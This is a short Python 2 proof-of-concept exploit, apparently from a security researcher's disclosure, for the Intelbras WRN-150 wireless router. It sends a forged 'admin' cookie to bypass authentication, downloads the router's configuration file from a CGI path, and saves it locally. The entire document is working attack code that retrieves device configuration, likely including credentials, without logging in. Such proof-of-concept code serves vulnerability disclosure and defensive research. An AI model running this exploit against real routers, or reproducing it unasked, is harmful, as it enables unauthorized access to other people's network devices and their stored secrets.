import urllib2

def crawl_auth():

	url = "http://10.0.0.1/cgi-bin/DownloadCfg/RouterCfm.cfg"
	req = urllib2.Request(url)
	req.add_header('Cookie', 'language=pt; admin:language=pt')

	rsp = urllib2.urlopen(req)
	html = rsp.read()
	print '[*] Codigo: %d - Tamanho: %d - URL: %s' % (rsp.code, len(html), url)

	bkp = open('backup.cfg', 'w')
	bkp.write(html)
	bkp.close()
	print '[+] Download realizado com sucesso !'

print '[+] Roteador Wireless Intelbras WRN-150'
print '[+] Pesquisador: Victor Pasknel (Morphus Labs)'
print ''

crawl_auth()